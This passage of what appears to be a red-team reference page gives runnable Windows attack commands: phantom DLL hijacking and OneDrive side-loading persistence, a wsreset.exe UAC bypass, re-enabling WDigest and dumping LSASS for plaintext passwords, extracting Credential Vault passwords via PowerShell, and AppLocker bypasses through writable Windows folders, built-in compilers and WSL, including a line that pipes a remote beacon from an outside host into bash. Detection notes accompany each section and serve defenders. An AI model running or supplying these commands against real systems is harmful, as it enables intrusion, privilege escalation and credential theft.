# 1. Directory of the executable
# 2. System directory (C:\Windows\System32)
# 3. Windows directory (C:\Windows)
# 4. Current working directory
# 5. Directories in %PATH%

# Phantom DLL hijacking (2024-2025 technique):
# Target: a DLL the binary imports that does NOT exist anywhere on disk
# Discovery method: use Procmon with filter:
#   Path ends with .dll AND Result = NAME NOT FOUND
# The resulting list = attack surface with zero detection baseline

# Common vulnerable signed binaries (drop these to user-writable dir + plant DLL):
# WinSAT.exe     → looks for WINMM.dll in current dir (copy to C:\Windows\Temp\)
# dxcap.exe      → looks for DXGIDebug.dll
# OneDriveStandaloneUpdater.exe → looks for Version.dll in AppData path

# Workflow:
# 1. Copy signed binary to C:\Users\Public\ or C:\Windows\Temp\
copy C:\Windows\System32\WinSAT.exe C:\Windows\Temp\WinSAT.exe

# 2. Drop malicious WINMM.dll in same directory:
copy C:\Users\Public\evil.dll C:\Windows\Temp\WINMM.dll

# 3. Execute — WINMM.dll loads from CWD before System32:
C:\Windows\Temp\WinSAT.exe

# Persistence via OneDrive updater DLL side-load:
# OneDriveStandaloneUpdater.exe runs at user logon via Task Scheduler
# If Version.dll is planted in %LOCALAPPDATA%\Microsoft\OneDrive\:
copy evil.dll "%LOCALAPPDATA%\Microsoft\OneDrive\Version.dll"
# Fires on every logon without any registry modification

# Detection notes:
#  - Sysmon Event ID 7 (ImageLoad): signed binary loading unsigned DLL from user-writable path
#  - Image path of loaded DLL doesn't match standard install location
#  - Monitor for Microsoft-signed binaries executing from temp/user directories
```

---

## 16. Additional UAC Bypasses

### 16.1 wsreset.exe — Microsoft Store Reset UAC Bypass

**Privilege required:** Medium integrity (standard user in Administrators group)  
**MITRE:** T1548.002

`wsreset.exe` auto-elevates (marked `autoElevate=true` in its manifest) and reads a registry key before launching — we control that key from HKCU.

> **Scenario:** fodhelper and eventvwr bypasses are detected by your target's EDR. wsreset targets a different registry path and has a lower detection baseline in most environments.

```bash
# === wsreset.exe UAC bypass ===

# Step 1: Write payload path to the specific HKCU key wsreset reads
reg add "HKCU\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command" ^
  /d "C:\Windows\Temp\beacon.exe" /f

# Step 2: Create DelegateExecute value (forces ShellExecute to use HKCU command)
reg add "HKCU\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command" ^
  /v "DelegateExecute" /d "" /f

# Step 3: Trigger wsreset — beacon.exe launches at High Integrity
start wsreset.exe

# Verify elevation:
whoami /groups | findstr "High Mandatory"

# Step 4: Clean up
reg delete "HKCU\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2" /f

# Requires: UAC set to "Notify only when apps make changes" (Windows default) or lower
# Does NOT work: UAC set to "Always notify"
# Works on: Windows 10, Windows 11 (as of 2025 — verify per build)

# Detection notes:
#  - Sysmon Event ID 13: write to HKCU\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2
#  - wsreset.exe spawning non-Microsoft Store process is highly anomalous
#  - Process integrity jump (medium → high) without UAC dialog
```

---

## 17. Credential Access Expansion

### 17.1 WDigest — Force Plaintext Credential Caching

**Privilege required:** High (Administrator / SYSTEM)  
**MITRE:** T1112 (Modify Registry), T1003.001 (LSASS Memory)

WDigest was disabled by default in Windows 8.1 (KB2871997). Re-enabling it causes every subsequent interactive logon to cache the plaintext password in LSASS memory, recoverable without Mimikatz using any LSASS dumping technique.

> **Scenario:** Credential Guard is not enabled and you can't dump LSASS immediately — the current logon session has only an NTLM hash (no plaintext). Set the WDigest key, wait for the target user to log in again (RDP, interactive logon, service restart), then dump LSASS for plaintext credentials.

```bash
# === WDigest — enable plaintext credential caching ===

# Enable (requires admin):
reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" ^
  /v UseLogonCredential /t REG_DWORD /d 1 /f

# Verify:
reg query "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential

# After a new interactive logon occurs, dump LSASS using comsvcs (Section 6.1):
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 784 C:\Windows\Temp\lsass.dmp full
# Parse with: pypykatz lsa minidump lsass.dmp
# Look for: authentication_id → wdigest → password field (now populated with cleartext)

# Reset to secure state (clean up):
reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" ^
  /v UseLogonCredential /t REG_DWORD /d 0 /f

# Limitations:
#  - Only new logons after the key change are cached in cleartext
#  - Existing sessions are unaffected until they re-authenticate
#  - Credential Guard completely blocks WDigest (LSA Isolated process)
#  - Check for Credential Guard: reg query HKLM\System\CurrentControlSet\Control\DeviceGuard

# Detection notes:
#  - This is one of the HIGHEST-FIDELITY hunting signals available
#  - UseLogonCredential = 1 should NEVER appear on a modern, healthy system
#  - Sysmon Event ID 13: registry value set on UseLogonCredential
#  - Alert: ANY write to this key with value 1
```

### 17.2 vaultcmd.exe — Windows Credential Vault Enumeration

**Privilege required:** Low (current user's vault); SYSTEM for other users  
**MITRE:** T1555.004 — Credentials from Password Stores: Windows Credential Manager

```bash
# === vaultcmd.exe — enumerate Windows Credential Manager ===

# List all vaults:
vaultcmd /list

# List web credentials (IE/Edge/Chrome saved passwords):
vaultcmd /listcreds:"Web Credentials"

# List Windows credentials (RDP targets, SMB connections, generic):
vaultcmd /listcreds:"Windows Credentials"

# List schemas:
vaultcmd /listschema

# Detailed properties:
vaultcmd /listproperties:"Web Credentials"

# What it reveals: usernames, target URLs/hostnames, credential type
# NOTE: vaultcmd does NOT dump cleartext passwords — passwords are DPAPI-protected
# To extract cleartext, use PowerShell + Windows Runtime PasswordVault API:
powershell -c "[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | % { $_.RetrievePassword(); $_ } | Select UserName,Resource,Password"

# Enumerate credential files location:
dir "%LOCALAPPDATA%\Microsoft\Credentials\" /a:h
dir "%APPDATA%\Microsoft\Credentials\" /a:h
# Files are DPAPI blobs — decrypt with SharpDPAPI offline or Mimikatz dpapi::cred

# Detection notes:
#  - vaultcmd.exe is legitimate but rarely invoked on endpoints
#  - Any vaultcmd execution outside known IT tooling should alert
#  - Event ID 4663: Object access to %LOCALAPPDATA%\Microsoft\Vault\
```

### 17.3 WerFault.exe — LSASS Crash Dump via Error Reporting

**Privilege required:** High (SeDebugPrivilege)  
**MITRE:** T1003.001

Windows Error Reporting (`WerFault.exe`) creates process dump files for crash analysis. It's a Microsoft-signed binary that legitimately accesses LSASS during crash dumps — use it to create an LSASS dump without using Mimikatz or a custom injector.

```bash
# === WerFault.exe — LSASS dump via Windows Error Reporting ===

# Method: trigger a controlled "fake crash report" for LSASS that dumps memory
# Get LSASS PID first:
wmic process where name='lsass.exe' get ProcessId

# Invoke WerFault against LSASS PID (replace 784 with actual PID):
# WerFault does not directly accept a PID argument for arbitrary dumps,
# but the following approaches work:

# Option A: Task Manager method (leaves less CLI evidence):
# In Task Manager → Details → right-click lsass.exe → Create Dump File
# Saved to: %TEMP%\lsass.DMP automatically

# Option B: ProcDump-style via Windows built-in (Server editions):
# werfault.exe is invoked by the system during a crash — trigger via:
# rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <PID> C:\Windows\Temp\lsass.dmp full
# (comsvcs method covered in Section 6.1, WerFault is an alternative investigative path)

# Option C: Register WerFault as post-mortem debugger (advanced):
# Hijack AeDebug registry to capture dump on next LSASS-touching event

# Detection notes:
#  - WerFault.exe accessing LSASS memory: Sysmon Event ID 10 (ProcessAccess)
#  - .DMP files appearing in %TEMP% or unusual directories
#  - PPL on LSASS (Windows 11 default) blocks this — requires PPL bypass first
```

---

## 18. AppLocker Bypass Techniques

**MITRE:** T1218 (Signed Binary Proxy Execution), T1027.004 (Compile After Delivery)

> **Scenario:** The target uses AppLocker with default rules allowing Microsoft-signed executables and denying everything else. Your payload is a PE file dropped to `C:\Windows\Temp\`. AppLocker blocks it. You need to execute your payload using only tools AppLocker allows.

### 18.1 Writable Subdirectories Under C:\Windows\

AppLocker default path rules typically allow all executables under `C:\Windows\`. Several subdirectories are writable by standard users on many Windows configurations:

```bash
# === AppLocker bypass via writable Windows subdirectories ===

# Check which directories under C:\Windows are user-writable:
# (Run as standard user)
icacls C:\Windows\Tasks          # Usually writable by Authenticated Users
icacls C:\Windows\Temp           # Writable
icacls C:\Windows\Tracing        # Often writable
icacls "C:\Windows\System32\spool\drivers\color"  # Writable in some configs
icacls "C:\Windows\System32\Tasks_Migrated"        # Check
icacls "C:\Windows\System32\FxsTmp"                # Often writable
icacls "C:\Windows\Registration\CRMLog"            # Check

# AppLocker allows execution from these paths if they're under C:\Windows\:
copy C:\elsewhere\beacon.exe C:\Windows\Tasks\beacon.exe
C:\Windows\Tasks\beacon.exe    # Allowed by AppLocker path rule

# Verify which paths AppLocker allows:
Get-AppLockerPolicy -Effective | Test-AppLockerPolicy -Path C:\Windows\Tasks\test.exe -User Everyone

# Detection notes:
#  - Executable in C:\Windows\Tasks\ that isn't a .job file is suspicious
#  - Sysmon: process create from non-standard Windows subdirectory
#  - AppLocker event log: EventID 8003/8004 (allowed/denied) in AppLocker/EXE
```

### 18.2 In-Box .NET Compilers — Compile-After-Delivery

```bash
# === Compile-After-Delivery — compile payload on target using built-in compilers ===
# The source file (.cs/.vb/.js) doesn't need execute permission, only read
# The compiler is Microsoft-signed → AppLocker allows it
# The compiled output is written to %TEMP% → execute from there

# C# compiler (csc.exe):
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe ^
  /out:C:\Windows\Tasks\payload.exe ^
  /unsafe C:\Users\Public\payload.cs

C:\Windows\Tasks\payload.exe  # Runs from AppLocker-allowed path

# VB compiler (vbc.exe):
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\vbc.exe ^
  /out:C:\Windows\Tasks\payload.exe ^
  C:\Users\Public\payload.vb

# JScript compiler (jsc.exe):
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\jsc.exe ^
  /out:C:\Windows\Tasks\p.exe ^
  C:\Users\Public\payload.js

# MSBuild inline task (no pre-compilation needed — see Section 1.1):
# The .csproj file is read and compiled in-memory by MSBuild
# MSBuild itself is allowed, the XML source file needs no execute permission
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe C:\Users\Public\evil.csproj

# Detection notes:
#  - csc.exe/vbc.exe/jsc.exe compiling from user directories then executing output
#  - AMSI inspects the compilation on 22H2+ (Build ≥22621) — source code scanned
#  - AppLocker EXE rule audit: unexpected compiler invocation from non-dev context
#  - Sysmon: csc.exe → child process chain
```

### 18.3 WSL — Bypass via Linux Subsystem

**Privilege required:** Low (if WSL is installed)  
**MITRE:** T1202 — Indirect Command Execution

```bash
# === WSL bypass — execute Linux binaries through Windows AppLocker ===
# WSL is increasingly present on developer workstations (Win10 2004+)

# Check if WSL is available:
wsl.exe --list --verbose
where wsl.exe

# Execute Linux commands (these bypass Windows AppLocker / WDAC rules):
wsl.exe -e bash -c "whoami"
wsl.exe -e python3 -c "import os; os.system('cmd.exe /c whoami')"

# Download and execute Linux binary (bypasses Windows AV/EDR scanning):
wsl.exe bash -c "curl -s http://10.10.14.5/elf_beacon | bash"

# Mount Windows filesystem from WSL and execute:
wsl.exe bash -c "cd /mnt/c/windows/temp && ./beacon"

# Detection notes:
#  - wsl.exe spawning child processes is anomalous in non-developer environments
#  - Many EDRs do not inspect Linux ELF binaries running through WSL
#  - Event: wsl.exe process creation; child bash/python making network connections
#  - WSL network traffic may bypass Windows-layer network inspection
```

---

## Quick Reference — Technique Matrix

| Objective | Built-in Tool | Privilege | MITRE ID |
|-----------|--------------|-----------|----------|
| Execute payload | msbuild.exe | Low | T1127.001 |
| Execute payload | wmic os get /format: | Low | T1220 |
| Execute payload | odbcconf /A REGSVR | Low | T1218.008 |
| Execute payload | forfiles /c | Low | T1218 |
| Execute payload | installutil /U | Low | T1218.004 |
| Download file | certutil -urlcache | Low | T1105 |
| Download file | desktopimgdownldr | Low | T1105 |
| Download file | mpcmdrun -DownloadFile | Low | T1105 |
| Download file | esentutl /y \\UNC | Low | T1105 |
| Persistence | WMI subscription | High | T1546.003 |
| Persistence | schtasks /create | Low/High | T1053.005 |
| Persistence | reg Run key | Low/High | T1547.001 |
| Persistence | sc create | High | T1543.003 |
| UAC bypass | fodhelper + registry | Medium | T1548.002 |
| UAC bypass | eventvwr + registry | Medium | T1548.002 |
| UAC bypass | cmstp /ni /s | Medium | T1218.003 |
| Evasion | wevtutil cl | High | T1070.001 |
| Evasion | vssadmin delete shadows | High | T1490 |
| Evasion | cipher /w | Low | T1485 |
| Cred dump | rundll32 comsvcs MiniDump | High | T1003.001 |
| Cred dump | reg save SAM/SYSTEM | High | T1003.002 |
| Cred dump | diskshadow + esentutl | High | T1003.003 |
| Cred dump | ntdsutil ifm create | High | T1003.003 |
| Lateral move | wmic /node: | High | T1047 |
| Lateral move | winrs -r: | High | T1021.006 |
| Lateral move | net use + schtasks | High | T1021.002 |
| Exfil | certreq -Post | Low | T1048.003 |
| Exfil | bitsadmin upload | Low | T1197 |
| Exfil | makecab + certutil | Low | T1560.001 |
| Recon | nltest /dclist: | Low | T1482 |
| Recon | dsquery / ldifde | Low | T1087.002 |
| Recon | net group /domain | Low | T1069.002 |
| Recon | findstr /si password | Low | T1552 |
| Execute payload | wscript.exe //E:VBScript | Low | T1059.005 |
| Execute payload | cscript.exe //E:JScript | Low | T1059.007 |
| Execute payload | SyncAppvPublishingServer.exe | Low | T1218 |
| Execute payload | regasm.exe /U evil.dll | Low | T1218.009 |
| Execute payload | regsvcs.exe evil.dll | High | T1218.009 |
| DLL injection | mavinject.exe PID /INJECTRUNNING | High | T1218.013 |
| Lateral move | DCOM MMC20.Application | High | T1021.003 |
| Lateral move | DCOM ShellWindows CLSID | High | T1021.003 |
| Lateral move | tscon.exe (RDP hijack) | SYSTEM | T1563.002 |
| Lateral move | ssh.exe -D (SOCKS pivot) | Low | T1021.004 |
| Lateral move | ssh.exe -L/-R (tunnel) | Low | T1572 |
| Persistence | COM CLSID hijack (HKCU) | Low | T1546.015 |
| Persistence | ADS payload (wscript stream) | Low | T1564.004 |
| Persistence | DLL search order hijack | Low | T1574.001 |
| UAC bypass | wsreset.exe + registry | Medium | T1548.002 |
| Cred dump | WDigest UseLogonCredential=1 | High | T1003.001 |
| Cred dump | vaultcmd /listcreds | Low | T1555.004 |
| Cred dump | WerFault LSASS dump | High | T1003.001 |
| AppLocker bypass | C:\Windows\Tasks\ (writable) | Low | T1218 |
| AppLocker bypass | csc.exe compile-after-delivery | Low | T1027.004 |
| AppLocker bypass | wsl.exe -e bash -c | Low | T1202 |

---

## Related Pages

- [LOLBins & LOLBAS](/evasion/lolbins/) — core binary catalog with basic usage
- [LOLBAS Full Reference](/evasion/lolbas-reference/) — complete binary matrix by attack category
- [Defense Evasion Overview](/evasion/av-edr-evasion/) — AV/EDR bypass theory and techniques
- [PowerShell Without PowerShell](/evasion/powershell-without-ps/) — executing PS logic via alternative runtimes
- [Fileless Techniques](/evasion/fileless-techniques/) — memory-only execution patterns
- [Post-Exploitation](/post-exploitation/) — privilege escalation, pivoting, and persistence depth
